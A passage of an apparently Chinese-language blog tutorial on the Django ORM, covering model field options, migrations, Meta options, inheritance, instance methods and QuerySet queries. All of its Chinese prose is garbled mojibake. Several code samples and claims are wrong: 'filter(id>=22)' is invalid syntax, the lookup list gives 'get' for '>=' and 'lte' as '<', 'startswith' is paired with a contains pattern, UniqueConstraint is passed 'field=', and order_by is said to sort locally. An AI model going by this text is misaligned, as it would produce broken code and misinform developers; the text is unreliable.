<li><p><code>unique</code><br>å”¯ä¸€çº¦æŸè®¾ç½®, é»˜è®¤ä¸º<code>False</code></p>
</li>
<li><p><code>default</code><br>è®¾ç½®å­—æ®µé»˜è®¤å€¼</p>
</li>
<li><p>æ—¶é—´ç±»å‹</p>
<ul>
<li><p><code>auto_now</code><br>æ¯æ¬¡ä¿å­˜æ—¶æ›´æ–°å­—æ®µæ—¶é—´ä¸ºç°åœ¨, åªæœ‰è°ƒç”¨<code>Model.seve()</code>æ—¶æ‰ä¼šç”Ÿæ•ˆ.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">update_time = models.DateTimeField(auto_now=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>auto_now_add</code><br>ç¬¬ä¸€æ¬¡åˆ›å»ºå¯¹è±¡æ—¶è®¾ç½®æ—¶é—´.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create_time = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p><strong>æµ‹è¯•ä¸€ä¸‹</strong></p>
<p>åˆ›å»ºåº”ç”¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py startapp myblog</span><br></pre></td></tr></table></figure>

<p>æ·»åŠ æ¨¡æ¿</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>(models.Model):</span><br><span class="line">    name = models.CharField(max_length=<span class="number">200</span>, primary_key=<span class="literal">True</span>)</span><br><span class="line">    email = models.EmailField(null=<span class="literal">True</span>)</span><br><span class="line">    date = models.DateField(auto_now=<span class="literal">True</span>)</span><br><span class="line">    update_time = models.DateTimeField(auto_now=<span class="literal">True</span>)</span><br><span class="line">    create_time = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    null_test = models.CharField(max_length=<span class="number">200</span>, null=<span class="literal">True</span>)</span><br><span class="line">    blank_test = models.CharField(max_length=<span class="number">200</span>, blank=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>æ›´æ–°åŒæ­¥</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> manage.<span class="keyword">py</span> makemigrations</span><br><span class="line"><span class="keyword">python</span> manage.<span class="keyword">py</span> migrate</span><br></pre></td></tr></table></figure>

<p>è¿›å…¥shell, åˆ›å»ºä¿å­˜ä¸€æ¡æ•°æ®</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> manage.<span class="keyword">py</span> <span class="keyword">shell</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; from myblog.models import Person</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p = Person(name=<span class="string">&#x27;owq&#x27;</span>)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.save()</span></span><br></pre></td></tr></table></figure>

<p>å›å¤´çœ‹çœ‹æ•°æ®åº“</p>
<p><img data-src="http://img.owq.world/2022/03/1553-ee0a9f.png"></p>
<h2 id="æ•°æ®è¡¨é‡æ„"><a href="#æ•°æ®è¡¨é‡æ„" class="headerlink" title="æ•°æ®è¡¨é‡æ„"></a>æ•°æ®è¡¨é‡æ„</h2><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><blockquote>
<p>æ‰§è¡Œ<code>python manage.py migrate</code>åŒæ­¥å¤±è´¥æ—¶</p>
</blockquote>
<ul>
<li>æ›´æ”¹<code>migrations</code>ä¸­çš„æ–‡ä»¶è§£å†³é—®é¢˜<ul>
<li>é€šè¿‡è°ƒè¯•ç¡®è®¤æ˜¯å“ªä¸ªå­—æ®µå‘ç”Ÿé”™è¯¯</li>
</ul>
</li>
</ul>
<h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><blockquote>
<p>æ•°æ®ç»“æ„å‘ç”Ÿæ”¹å˜æ—¶</p>
</blockquote>
<ul>
<li>åˆ é™¤<code>migrations</code>æ–‡ä»¶ç„¶åæ¨å€’é‡æ¥<ul>
<li><code>django</code>ä¼šåœ¨æ•°æ®è¡¨<code>django_migrations</code>ä¸­åˆ›å»ºåŒæ­¥è®°å½•, éœ€è¦åˆ é™¤å¯¹åº”çš„åŒæ­¥è®°å½•</li>
<li>åˆ é™¤å·²ç»åˆ›å»ºè®°å½•çš„è¡¨</li>
</ul>
</li>
</ul>
<h2 id="Metaå†…åµŒç±»"><a href="#Metaå†…åµŒç±»" class="headerlink" title="Metaå†…åµŒç±»"></a>Metaå†…åµŒç±»</h2><blockquote>
<p>é€šè¿‡ä¸€ä¸ªå†…åµŒç±»Metaæ¥å®šä¹‰å…ƒæ•°æ®.<br>å…ƒæ•°æ®åˆè¢«ç§°ä¸ºä¸­ä»‹æ•°æ®, ç”¨æ¥æè¿°æ•°æ®çš„æ•°æ®, æ—¢â€œæ‰€æœ‰ä¸æ˜¯å­—æ®µçš„ä¸œè¥¿â€.</p>
</blockquote>
<h3 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ox</span>(models.Model):</span><br><span class="line">    horn_length = models.IntegerField()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">        ordering = [<span class="string">&quot;horn_length&quot;</span>]</span><br><span class="line">        verbose_name_plural = <span class="string">&quot;oxen&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="å­—æ®µé€‰é¡¹"><a href="#å­—æ®µé€‰é¡¹" class="headerlink" title="å­—æ®µé€‰é¡¹"></a>å­—æ®µé€‰é¡¹</h3><ul>
<li><p><code>abstract</code><br>å°†å½“å‰æ¨¡å‹ç±»è½¬æ¢ä¸ºæŠ½è±¡ç±», è¿›è¡Œ<code>migrate</code>çš„æ—¶å€™ä¼šè¢«å¿½ç•¥, ä¹Ÿå°±ä¸ä¼šå¯¹å®ä½“è¡¨è¿›è¡Œä¿®æ”¹.</p>
</li>
<li><p><code>app_label</code><br>æŒ‡å®šå½“å‰<code>model</code>ä»å±äºå“ªä¸ªå·²ç»æ³¨å†Œçš„åº”ç”¨.<br>ä¸€èˆ¬ä¸ºåº”ç”¨åªç¼–å†™è§†å›¾å±‚æ¥å¤„ç†ä¸šåŠ¡é€»è¾‘. æ¨¡å‹å±‚ç»Ÿä¸€ç”±ä¸€ä¸ª<code>models</code>æ¨¡å—æ¥ç®¡ç†<br>æ¯”å¦‚åšå®¢çš„ä¸ªäººä¿¡æ¯<code>models</code>, å¾ˆå¤šåº”ç”¨éƒ½ä¼šä½¿ç”¨åˆ°, è¿™æ—¶å°±è¦ä½¿ç”¨<code>app_label</code>æ¥åŒºåˆ†æ‰€å±åº”ç”¨äº†.</p>
</li>
<li><p><code>db_table</code><br>è‡ªå®šä¹‰è¡¨å, ä¸æŒ‡å®šé»˜è®¤ä¸º<code>åº”ç”¨å_æ¨¡å‹å</code>, ä¸€èˆ¬åœ¨ä»¥ä¸‹æƒ…å†µä½¿ç”¨.</p>
<ul>
<li>ç›®æ ‡è¡¨å·²ç»å­˜åœ¨æ—¶</li>
<li>æ²¡æœ‰ç®¡ç†è¡¨çš„æƒé™. éœ€è¦dbaå»ºè¡¨å†å¼€å‘æ—¶</li>
<li>è§„èŒƒæ•°æ®åº“çš„è¡¨åå‘½åæ—¶</li>
</ul>
</li>
<li><p><code>managed</code><br>é»˜è®¤ä¸º<code>True</code>, ä¸º<code>False</code>å°†ä¸ä¼šé’ˆå¯¹å½“å‰æ¨¡å‹åˆ›å»ºå’Œåˆ é™¤æ•°æ®åº“è¡¨, ä¹Ÿå°±æ˜¯ä¼šå¿½ç•¥è¯¥æ¨¡å‹. ä¸€èˆ¬ä¼šåœ¨å…¬å¸æœ‰DBAæ—¶ä½¿ç”¨.</p>
</li>
<li><p><code>ordering</code><br>è®¾ç½®æ’åºå­—æ®µ, é»˜è®¤è§„åˆ™ä¸ºå‡åº.</p>
<ul>
<li><p>é»˜è®¤å‡åº</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ordering = <span class="string">&#x27;order_date&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>-</code>å·è¡¨ç¤ºé™åº</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ordering = [<span class="string">&#x27;-order_date&#x27;</span>]</span><br><span class="line">ordering = [<span class="string">&#x27;-pub_date&#x27;</span>, <span class="string">&#x27;author&#x27;</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>?</code>å·è¡¨ç¤ºéšæœº</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ordering = [<span class="string">&#x27;?field_name&#x27;</span>]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>get_latest_by</code><br>è®¾ç½®è·å–æœ€åä¸€æ¡è®°å½•çš„æ’åºè§„åˆ™, å’Œæ¨¡å‹çš„å®ä¾‹æ–¹æ³•<code>latest()</code>ç›¸å…³è”</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å‡åºæ’åº order_date å­—æ®µ</span></span><br><span class="line">get_latest_by = <span class="string">&#x27;order_date&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é™åºæ’åº priority, åå‡åºæ’åº order_date</span></span><br><span class="line">get_latest_by = [<span class="string">&#x27;-priority&#x27;</span>, <span class="string">&#x27;order_date&#x27;</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>indexes</code><br>è®¾ç½®ç´¢å¼•, åŒæ ·çš„, åœ¨ç”±DBAçš„æƒ…å†µä¸‹ä¸éœ€è¦ç”¨åˆ°.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">    indexes = [</span><br><span class="line">        models.Index(fields=[<span class="string">&#x27;last_name&#x27;</span>, <span class="string">&#x27;first_name&#x27;</span>]),</span><br><span class="line">        models.Index(fields=[<span class="string">&#x27;first_name&#x27;</span>], name=<span class="string">&#x27;first_name_idx&#x27;</span>),</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>constraints</code><br>è‡ªå®šä¹‰çº¦æŸ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">    constraints = [</span><br><span class="line">        <span class="comment"># åˆ›å»ºä¸€ä¸ªæ£€æŸ¥çº¦æŸ</span></span><br><span class="line">        <span class="comment"># ç¡®ä¿å¹´é¾„ç­‰äº18</span></span><br><span class="line">        models.CheckConstraint(check=models.Q(age__gte=<span class="number">18</span>), name=<span class="string">&#x27;age_gte_18&#x27;</span>),</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># åˆ›å»ºä¸€ä¸ªå”¯ä¸€çº¦æŸ</span></span><br><span class="line">        <span class="comment"># ç¡®ä¿æ¯ä¸ªæˆ¿é—´åœ¨æ¯ä¸ªæ—¥æœŸåªèƒ½è¢«é¢„è®¢ä¸€æ¬¡</span></span><br><span class="line">		UniqueConstraint(field=[<span class="string">&#x27;room&#x27;</span>, <span class="string">&#x27;date&#x27;</span>], name=<span class="string">&#x27;unique_booking&#x27;</span>)</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>unique_together</code><br>å¤šå­—æ®µå”¯ä¸€æ€§çº¦æŸ(æœªæ¥å¯èƒ½è¢«å¼ƒç”¨, äº†è§£ä¸‹å°±è¡Œ)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¸€ç»„å­—æ®µåï¼Œåˆèµ·æ¥å¿…é¡»æ˜¯å”¯ä¸€çš„</span></span><br><span class="line">unique_together = [<span class="string">&#x27;driver&#x27;</span>, <span class="string">&#x27;restaurant&#x27;</span>]</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="æ¨¡å‹ç»§æ‰¿"><a href="#æ¨¡å‹ç»§æ‰¿" class="headerlink" title="æ¨¡å‹ç»§æ‰¿"></a>æ¨¡å‹ç»§æ‰¿</h2><h3 id="ç›´æ¥ç»§æ‰¿"><a href="#ç›´æ¥ç»§æ‰¿" class="headerlink" title="ç›´æ¥ç»§æ‰¿"></a>ç›´æ¥ç»§æ‰¿</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CommonInfo</span>(models.Model):</span><br><span class="line">    name = models.CharField(max_length=<span class="number">100</span>)</span><br><span class="line">    age = models.PositiveIntegerField()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">        abstract = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">CommonInfo</span>):</span><br><span class="line">    home_group = models.CharField(max_length=<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<h3 id="å¤šé‡ç»§æ‰¿"><a href="#å¤šé‡ç»§æ‰¿" class="headerlink" title="å¤šé‡ç»§æ‰¿"></a>å¤šé‡ç»§æ‰¿</h3><blockquote>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒDjango ç»™æ¯ä¸ªæ¨¡å‹ä¸€ä¸ªè‡ªåŠ¨é€’å¢çš„ä¸»é”®.<br>å¦‚æœå½“å‰æ¨¡å‹å¯¹è±¡æ²¡æœ‰æŒ‡å®šä¸»é”®, é‚£ä¹ˆä¸¤å¼ è¡¨ä¸»é”®ä¼šäº§ç”Ÿå†²çª, ä¸ºäº†è§£å†³å¤šé‡ç»§æ‰¿äº§ç”Ÿçš„idå†²çª, éœ€è¦è¦†ç›–ä¸»é”®å­—æ®µ.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(models.Model):</span><br><span class="line">    <span class="comment"># db_columnä¸ºæ•°æ®åº“ä¸­çš„å­—æ®µ</span></span><br><span class="line">    student_id = models.AutoField(primary_key=<span class="literal">True</span>, db_column=<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    name = models.CharField(max_length=<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Book</span>(models.Model):</span><br><span class="line">    book_id = models.AutoField(primary_key=<span class="literal">True</span>, db_column=<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    book_name = models.CharField(max_length=<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BorrowRecord</span>(Student, Book):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ä¸¤å¼ è¡¨ä¸»é”®å†²çªæ—¶, è¦è¦†ç›–ä¸»é”®å­—æ®µ</span></span><br><span class="line">    _<span class="built_in">id</span> = models.AutoField(primary_key=<span class="literal">True</span>, db_column=<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    borrow_time = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<h2 id="å®ä¾‹æ–¹æ³•"><a href="#å®ä¾‹æ–¹æ³•" class="headerlink" title="å®ä¾‹æ–¹æ³•"></a>å®ä¾‹æ–¹æ³•</h2><ul>
<li><p><code>save()</code><br>å°†å¯¹è±¡ä¿å­˜åˆ°æ•°æ®åº“(æˆ–è¿›è¡Œæ›´æ–°æ“ä½œ)</p>
<blockquote>
<p>åªä¼šè¿›è¡Œæ•°æ®åº“æ“ä½œ, å¹¶ä¸ä¼šè¿›è¡Œå­—æ®µéªŒè¯.</p>
</blockquote>
</li>
<li><p><code>clean_fields()</code><br>éªŒè¯æ¨¡å‹ä¸Šæ‰€æœ‰å­—æ®µ, è°ƒç”¨<code>save()</code>æ–¹æ³•æ—¶ä¸ä¼šè¢«è‡ªåŠ¨è°ƒç”¨.</p>
</li>
<li><p><code>clean()</code><br>è‡ªå®šä¹‰æ¨¡å‹éªŒè¯çš„æ–¹æ³•.</p>
</li>
<li><p><code>validate_unique()</code><br>éªŒè¯æ¨¡å‹ä¸Šæ‰€æœ‰å”¯ä¸€çº¦æŸ, å’Œ<code>unique_together</code>å±æ€§æ­é…ä½¿ç”¨.</p>
</li>
<li><p><code>full_clean()</code></p>
<p>ä¾æ¬¡è°ƒç”¨ Model.clean_fields()ã€ Model.clean() å’Œ Model.validate_unique()</p>
</li>
<li><p><code>latest()</code><br>è·å–æœ€åä¸€æ¡è®°å½•, æ ¹æ®<code>get_latest_by</code>å±æ€§è¿›è¡Œè·å–.</p>
</li>
<li><p><code>refresh_from_db()</code><br>ä»æ•°æ®åº“é‡Œåˆ·æ–°å½“å‰è®°å½•, é€‚ç”¨äºæ•°æ®åº“æ•°æ®å‘ç”Ÿå˜åŠ¨æ—¶.</p>
</li>
<li><p><code>__str__()</code><br>ç”¨æ¥è‡ªå®šä¹‰æ¨¡å‹è¾“å‡º.</p>
</li>
</ul>
<h2 id="django-setup"><a href="#django-setup" class="headerlink" title="django.setup()"></a>django.setup()</h2><blockquote>
<p>ç”¨æ¥ç‹¬ç«‹è¿è¡ŒDjangoä¸­çš„åº”ç”¨, ç±»ä¼¼äºç¬¬ä¸‰æ–¹åº“çš„ä½¿ç”¨.<br>æ¯”å¦‚ï¼Œç¼–å†™ä¸€ä¸ªè„šæœ¬, ç„¶åè¿›è¡Œä¸€äº›ORMæ“ä½œ, åŒæ—¶ä¹Ÿæ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œè°ƒè¯•.</p>
</blockquote>
<p>è¿™é‡Œåˆ›å»ºä¸€ä¸ªæµ‹è¯•æ–‡ä»¶<code>test.py</code>, ä½¿ç”¨å®ƒæ¥è¿›è¡Œè°ƒè¯•å­¦ä¹ .</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> django</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_person_data</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        person = Person(</span><br><span class="line">            name=<span class="string">f&#x27;name_<span class="subst">&#123;i&#125;</span>&#x27;</span>,</span><br><span class="line">            email=<span class="string">f&#x27;email_<span class="subst">&#123;i&#125;</span>@163.com&#x27;</span>,</span><br><span class="line">            null_test=<span class="literal">None</span>,</span><br><span class="line">            blank_test=<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è¿è¡Œå­—æ®µæ ¡éªŒ</span></span><br><span class="line">        <span class="comment"># éœ€è¦æ³¨æ„è¿™é‡Œéœ€è¦æ’é™¤ null_test å­—æ®µ, å¿½ç•¥ NULL å€¼çš„æ ¡éªŒ</span></span><br><span class="line">        person.clean_fields(exclude=[<span class="string">&#x27;null_test&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ä¿å­˜æ•°æ®</span></span><br><span class="line">        person.save()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è®¾ç½®DJANGO_SETTINGS_MODULEç¯å¢ƒå˜é‡</span></span><br><span class="line">    os.environ.setdefault(<span class="string">&quot;DJANGO_SETTINGS_MODULE&quot;</span>, <span class="string">&quot;mysite.settings&quot;</span>)</span><br><span class="line">    django.setup()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> myblog.models <span class="keyword">import</span> Person</span><br><span class="line"></span><br><span class="line">    create_person_data()</span><br></pre></td></tr></table></figure>

<h2 id="QuerySet-API"><a href="#QuerySet-API" class="headerlink" title="QuerySet API"></a>QuerySet API</h2><blockquote>
<p><code>QuerySet</code> æœ¬èº«è¢«æ„é€ ï¼Œè¿‡æ»¤ï¼Œåˆ‡ç‰‡ï¼Œæˆ–è€…å¤åˆ¶èµ‹å€¼ç­‰æ“ä½œï¼Œæ˜¯æ— éœ€è®¿é—®æ•°æ®åº“çš„ã€‚<br>åªæœ‰åœ¨ä½ éœ€è¦ä»æ•°æ®åº“å–å‡ºæ•°æ®æˆ–è€…å‘æ•°æ®åº“å­˜å…¥æ•°æ®æ—¶æ‰éœ€è¦è®¿é—®æ•°æ®åº“.</p>
</blockquote>
<p>ä¸‹é¢ç”¨CRUDç»™è¿™äº›æ–¹æ³•è¿›è¡Œåˆ†ç±»</p>
<ul>
<li><p><strong>Create</strong></p>
<ul>
<li><code>save()</code></li>
</ul>
</li>
<li><p><strong>Retrieve</strong></p>
<ul>
<li><p><code>all()</code><br>è·å–è¡¨ä¸­æ‰€æœ‰è®°å½•.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Model.objects.<span class="built_in">all</span>()</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>get()</code><br>é€šè¿‡æŒ‡å®šæ¡ä»¶, è·å–<strong>ä¸€æ¡</strong>æ•°æ®, å¦‚æœæœ‰å¤šæ¡æˆ–ä¸å­˜åœ¨, åˆ™ä¼šæŠ¥é”™.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SELECT ... WHERE id = 22;</span></span><br><span class="line">Model.objects.get(<span class="built_in">id</span>=<span class="number">22</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>filter()</code><br>åŒ¹é…æ»¡è¶³æ¡ä»¶çš„è®°å½•, ç±»ä¼¼äº<code>SQL</code>ä¸­çš„<code>WHERE</code>è¯­å¥.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SELECT ... WHERE name = name_0;</span></span><br><span class="line">Model.objects.<span class="built_in">filter</span>(name=<span class="string">&quot;name_0&quot;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>Django</code>ä½¿ç”¨<code>__</code>æ¥ä½œä¸ºè¿‡æ»¤æ¡ä»¶æ ‡è¯†ç¬¦, åé¢æ¥ä¸Šå…³é”®å­—æ¥è¿›è¡ŒæŸ¥è¯¢.</p>
</blockquote>
<p><strong>æ¡ä»¶æŸ¥è¯¢</strong></p>
<ul>
<li>gt --- &gt;</li>
<li>get -- &gt;&#x3D;</li>
<li>lt --- &lt;</li>
<li>lte -- &lt;</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SELECT ... WHERE id &gt; 22;</span></span><br><span class="line">Model.objects.<span class="built_in">filter</span>(id__gt=<span class="number">22</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SELECT ... WHERE id &lt;= 22;</span></span><br><span class="line">Model.objects.<span class="built_in">filter</span>(id__lte=<span class="number">22</span>)</span><br></pre></td></tr></table></figure>

<p><strong>æ¨¡ç³ŠæŸ¥è¯¢</strong></p>
<ul>
<li>startswith --- åŒ¹é…å¼€å¤´</li>
<li>endswith ----- åŒ¹é…ç»“å°¾</li>
<li>icontains ---- åŒ¹é…å†…å®¹</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SELECT ... WHERE name LIKE &#x27;Lennon%&#x27;;</span></span><br><span class="line">Model.objects.<span class="built_in">filter</span>(name__startswith=<span class="string">&#x27;Lennon&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SELECT ... WHERE name LIKE &#x27;%Lennon%&#x27;;</span></span><br><span class="line">Model.objects.<span class="built_in">filter</span>(name__startswith=<span class="string">&#x27;%Lennon%&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>exclude()</code><br>åŒ¹é…ä¸åŒ¹é…å¯¹è±¡, ä¸<code>filter()</code>é€»è¾‘ç›¸å.</p>
</li>
<li><p><code>latest()</code></p>
<p>è¿”å›æœ€åä¸€æ¡æ•°æ®.</p>
</li>
<li><p><code>order_by()</code></p>
<p>è®¾ç½®æ’åº, å¯ä»¥è¦†ç›–<code>ordering</code>é€‰é¡¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è¿™é‡Œéœ€è¦æ³¨æ„, æ’åºå¹¶ä¸æ¶‰åŠæ•°æ®åº“æ“ä½œ, æ˜¯åœ¨æœ¬åœ°è¿›è¡Œçš„</span></span><br><span class="line">Model.objects.<span class="built_in">all</span>().order_by(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;id&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Update</strong></p>
<ul>
<li><code>save()</code></li>
</ul>
</li>
<li><p><strong>Delete</strong></p>
<ul>
<li><p><code>delete()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ é™¤idå¤§äº</span></span><br><span class="line">Model.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>&gt;=<span class="number">22</span>).delete()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="é«˜çº§"><a href="#é«˜çº§" class="headerlink" title="é«˜çº§"></a>é«˜çº§</h2><h3 id="åŸå§‹SQL"><a href="#åŸå§‹SQL" class="headerlink" title="åŸå§‹SQL"></a>åŸå§‹SQL</h3><blockquote>
<p>é‡åˆ°å¤æ‚çš„åœºæ™¯, ä½¿ç”¨<code>raw()</code>æ¥æ‰§è¡Œ<code>SQL</code>è¯­å¥.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Reader._meta.db_table -- è®°å½•æ‰€åœ¨è¡¨å</span></span><br><span class="line">Mode.objects.raw(<span class="string">f&quot;select * from <span class="subst">&#123;Reader._meta.db_table&#125;</span> limit 1&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="å¤šä¸ªæ•°æ®åº“"><a href="#å¤šä¸ªæ•°æ®åº“" class="headerlink" title="å¤šä¸ªæ•°æ®åº“"></a>å¤šä¸ªæ•°æ®åº“</h3><p>ä¿®æ”¹<code>mysite/settings.py</code>æ·»åŠ æ•°æ®åº“é…ç½®.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.mysql&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;NAME&#x27;</span>: <span class="string">&#x27;polls&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;USER&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PASSWORD&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;HOST&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PORT&#x27;</span>: <span class="string">&#x27;3306&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;person&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.mysql&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;NAME&#x27;</span>: <span class="string">&#x27;person&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;USER&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PASSWORD&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;HOST&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PORT&#x27;</span>: <span class="string">&#x27;3306&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ <code>using</code> å‚æ•°æŒ‡å®šæ•°æ®åº“.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">person.save(using=<span class="string">&#x27;person&#x27;</span>)</span><br><span class="line">Person.objects.using(<span class="string">&#x27;person&#x27;</span>).<span class="built_in">all</span>()</span><br></pre></td></tr></table></figure>

<h3 id="äº‹åŠ¡"><a href="#äº‹åŠ¡" class="headerlink" title="äº‹åŠ¡"></a>äº‹åŠ¡</h3><p>ä½¿ç”¨<code>transaction.atomic()</code>æ§åˆ¶æ•°æ®åº“äº‹åŠ¡</p>
<ul>
<li><p>åŸºäºHTTPè¯·æ±‚çš„äº‹åŠ¡</p>
<ul>
<li>åœ¨<code>settings</code>ä¸­è¦è®¾ç½®<code>ATOMIC_REQUESTS</code>ä¸º<code>True</code></li>
</ul>
